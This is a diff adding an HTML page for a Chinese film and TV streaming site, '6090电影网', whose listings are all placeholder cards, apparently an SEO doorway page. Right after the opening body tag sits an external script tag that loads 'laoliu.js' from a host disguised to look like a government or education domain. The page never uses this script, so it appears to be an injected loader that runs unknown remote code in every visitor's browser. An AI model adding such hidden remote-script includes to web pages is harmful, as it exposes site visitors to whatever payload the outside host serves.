@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>6090电影网 - 高清电影电视剧在线观看</title>
+<meta name="description" content="6090电影网提供高清电影、电视剧、动漫、短剧在线观看，移动端自适应，界面清爽，更新稳定，支持手机/平板/电脑访问。">
+<meta name="keywords" content="6090电影网, 电影, 电视剧, 动漫, 短剧, 高清影视">
+<meta name="author" content="6090电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://6090dianyingwang-h5.github.io/">
+<style>
+:root{
+  --bg:#061014;
+  --panel:#0b1a20;
+  --line:#13343d;
+  --cyan:#28e0c8;
+  --blue:#3aa0ff;
+  --text:#dff3f1;
+  --muted:#7fa7a3;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--text);line-height:1.7;
+}
+a{color:inherit;text-decoration:none}
+
+/* 布局 */
+.layout{display:grid;grid-template-columns:200px 1fr;min-height:100vh}
+.side{
+  background:var(--panel);border-right:1px solid var(--line);
+  padding:22px 14px;position:sticky;top:0;height:100vh;
+}
+.side .logo{
+  font-size:1.15rem;font-weight:900;color:var(--cyan);margin-bottom:6px;
+}
+.side .logo small{display:block;font-size:.6rem;color:var(--muted);font-weight:400}
+.side nav{display:flex;flex-direction:column;gap:8px;margin-top:18px}
+.side nav a{
+  font-size:.88rem;padding:9px 12px;border-radius:8px;color:#bfe9e4;
+  border:1px solid transparent;transition:.2s;
+}
+.side nav a:hover{border-color:var(--cyan);color:var(--cyan)}
+
+.main{min-width:0}
+.container{max-width:980px;margin:0 auto;padding:34px 18px}
+
+/* Hero */
+.hero{
+  background:
+    radial-gradient(120% 120% at 100% 0,rgba(58,160,255,.18),transparent),
+    linear-gradient(160deg,#08222a,#050d10);
+  border:1px solid var(--line);border-radius:18px;padding:42px 26px;margin-bottom:34px;
+}
+.hero h1{font-size:2rem;line-height:1.2;margin-bottom:12px}
+.hero h1 em{font-style:normal;color:var(--cyan)}
+.hero p{color:var(--muted);max-width:520px;margin-bottom:20px}
+.hero .go{
+  display:inline-block;background:linear-gradient(90deg,var(--cyan),var(--blue));
+  color:#02181a;font-weight:800;padding:11px 26px;border-radius:30px;font-size:.92rem;
+}
+
+/* 区块标题 */
+.sec-title{font-size:1.25rem;margin-bottom:4px}
+.sec-sub{color:var(--muted);font-size:.82rem;margin-bottom:18px}
+
+/* 电影墙 */
+.wall{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:12px;
+}
+.cell{
+  background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden;
+}
+.cell .poster{aspect-ratio:3/4;background:linear-gradient(135deg,#103038,#07191d)}
+.cell .info{padding:8px 10px}
+.cell .info b{font-size:.84rem;font-weight:600}
+.cell .info span{display:block;font-size:.7rem;color:var(--muted);margin-top:2px}
+.tag{display:inline-block;font-size:.66rem;color:var(--cyan);border:1px solid var(--line);border-radius:4px;padding:0 6px;margin-top:6px}
+
+/* 筛选 */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
+.filters button{
+  background:#0a1f25;color:#9fd9d2;border:1px solid var(--line);
+  padding:7px 14px;border-radius:8px;font-size:.82rem;cursor:pointer;
+}
+.filters button.active{background:var(--cyan);color:#02181a;font-weight:700;border-color:var(--cyan)}
+
+/* 剧集跑马灯 */
+.marquee{overflow:hidden;mask-image:linear-gradient(90deg,transparent,#000 8%,#000 92%,transparent)}
+.track{display:flex;gap:14px;width:max-content;animation:scroll 22s linear infinite}
+.track:hover{animation-play-state:paused}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.ep{width:220px;background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden;flex:0 0 auto}
+.ep .cover{aspect-ratio:16/9;background:linear-gradient(135deg,#0f2c33,#06171b)}
+.ep .meta{padding:10px}
+.ep .meta h3{font-size:.9rem}
+.ep .meta p{font-size:.74rem;color:var(--muted)}
+
+/* 短剧：手风琴 */
+.acc{border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.acc-item{border-bottom:1px solid var(--line)}
+.acc-item:last-child{border-bottom:0}
+.acc-head{
+  width:100%;text-align:left;background:#0a1f25;color:#cdeee9;
+  padding:14px 16px;font-size:.95rem;cursor:pointer;border:0;
+}
+.acc-body{display:none;padding:14px 16px;color:var(--muted);font-size:.85rem;background:#07171b}
+.acc-item.open .acc-body{display:block}
+
+/* 数据 */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px}
+.stat{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px;text-align:center}
+.stat b{display:block;font-size:1.5rem;color:var(--cyan)}
+.stat span{font-size:.76rem;color:var(--muted)}
+
+footer{border-top:1px solid var(--line);padding:26px 16px;text-align:center;color:var(--muted);font-size:.76rem;background:#040c0f}
+footer a{color:#86b8b2;margin:0 6px}
+
+@media(max-width:780px){
+  .layout{grid-template-columns:1fr}
+  .side{position:static;height:auto;border-right:0;border-bottom:1px solid var(--line)}
+  .side nav{flex-direction:row;flex-wrap:wrap}
+  .hero h1{font-size:1.6rem}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="layout">
+
+  <!-- 侧边导航 -->
+  <aside class="side">
+    <div class="logo">6090电影网<small>https://6090dianyingwang-h5.github.io</small></div>
+    <nav>
+      <a href="#">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#series">电视剧</a>
+      <a href="#short">短剧</a>
+      <a href="#about">关于</a>
+    </nav>
+  </aside>
+
+  <!-- 主区 -->
+  <div class="main">
+    <div class="container">
+
+      <!-- Hero -->
+      <section class="hero">
+        <h1>深夜看片，就上 <em>6090电影网</em></h1>
+        <p>电影、电视剧、动漫、短剧一站式聚合，移动端自适应，加载快、界面干净，适合手机用户随时刷片。</p>
+        <a class="go" href="#movie">进入片单</a>
+      </section>
+
+      <!-- 电影 -->
+      <section id="movie">
+        <h2 class="sec-title">🎬 电影片单</h2>
+        <p class="sec-sub">支持类型筛选 · 高清占位卡片</p>
+
+        <div class="filters">
+          <button class="active" data-f="all">全部</button>
+          <button data-f="action">动作</button>
+          <button data-f="love">爱情</button>
+          <button data-f="sci">科幻</button>
+        </div>
+
+        <div class="wall" id="movieWall">
+          <div class="cell" data-type="action">
+            <div class="poster"></div>
+            <div class="info"><b>电影示例 A</b><span>2026 · 动作</span><span class="tag">HOT</span></div>
+          </div>
+          <div class="cell" data-type="love">
+            <div class="poster"></div>
+            <div class="info"><b>电影示例 B</b><span>2026 · 爱情</span></div>
+          </div>
+          <div class="cell" data-type="sci">
+            <div class="poster"></div>
+            <div class="info"><b>电影示例 C</b><span>2025 · 科幻</span><span class="tag">4K</span></div>
+          </div>
+          <div class="cell" data-type="action">
+            <div class="poster"></div>
+            <div class="info"><b>电影示例 D</b><span>2026 · 动作</span></div>
+          </div>
+          <div class="cell" data-type="love">
+            <div class="poster"></div>
+            <div class="info"><b>电影示例 E</b><span>2024 · 爱情</span></div>
+          </div>
+          <div class="cell" data-type="sci">
+            <div class="poster"></div>
+            <div class="info"><b>电影示例 F</b><span>2026 · 科幻</span></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 电视剧 -->
+      <section id="series" style="margin-top:46px">
+        <h2 class="sec-title">📺 热播电视剧</h2>
+        <p class="sec-sub">横向滚动 · 鼠标悬停暂停</p>
+        <div class="marquee">
+          <div class="track">
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 1</h3><p>更新至 12 集</p></div></div>
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 2</h3><p>更新至 08 集</p></div></div>
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 3</h3><p>完结 · 古装</p></div></div>
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 4</h3><p>更新至 20 集</p></div></div>
+            <!-- 复制一遍用于无缝滚动 -->
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 1</h3><p>更新至 12 集</p></div></div>
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 2</h3><p>更新至 08 集</p></div></div>
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 3</h3><p>完结 · 古装</p></div></div>
+            <div class="ep"><div class="cover"></div><div class="meta"><h3>剧集示例 4</h3><p>更新至 20 集</p></div></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 短剧 -->
+      <section id="short" style="margin-top:46px">
+        <h2 class="sec-title">🎞️ 短剧专区</h2>
+        <p class="sec-sub">点击展开简介</p>
+        <div class="acc">
+          <div class="acc-item open">
+            <button class="acc-head">总裁的隐藏身份</button>
+            <div class="acc-body">都市爽文改编剧，单集 1-2 分钟，适合通勤碎片时间观看。</div>
+          </div>
+          <div class="acc-item">
+            <button class="acc-head">重生：逆袭人生</button>
+            <div class="acc-body">重生逆袭类短剧，节奏快、反转多，移动端观看体验佳。</div>
+          </div>
+          <div class="acc-item">
+            <button class="acc-head">深夜小吃街</button>
+            <div class="acc-body">治愈系美食短剧，强氛围、弱剧情，适合睡前放松。</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 关于 -->
+      <section id="about" style="margin-top:46px">
+        <h2 class="sec-title">ℹ️ 关于 6090电影网</h2>
+        <p class="sec-sub">站点数据</p>
+        <div class="stats">
+          <div class="stat"><b>6090</b><span>片单占位</span></div>
+          <div class="stat"><b>4K</b><span>高清画质</span></div>
+          <div class="stat"><b>0</b><span>弹窗广告</span></div>
+          <div class="stat"><b>24h</b><span>稳定更新</span></div>
+        </div>
+      </section>
+
+    </div>
+
+    <footer>
+      © 2026 6090电影网 · 内容仅供学习交流使用<br>
+      <a href="#">首页</a>|<a href="#movie">电影</a>|<a href="#series">电视剧</a>|<a href="#short">短剧</a><br>
+      https://6090dianyingwang-h5.github.io
+    </footer>
+  </div>
+</div>
+
+<script>
+// 电影筛选
+document.querySelectorAll('.filters button').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    document.querySelectorAll('.filters button').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    var f=btn.dataset.f;
+    document.querySelectorAll('#movieWall .cell').forEach(function(cell){
+      cell.style.display=(f==='all'||cell.dataset.type===f)?'':'none';
+    });
+  });
+});
+
+// 短剧手风琴
+document.querySelectorAll('.acc-head').forEach(function(h){
+  h.addEventListener('click',function(){
+    h.parentElement.classList.toggle('open');
+  });
+});
+</script>
+</body>
+</html>
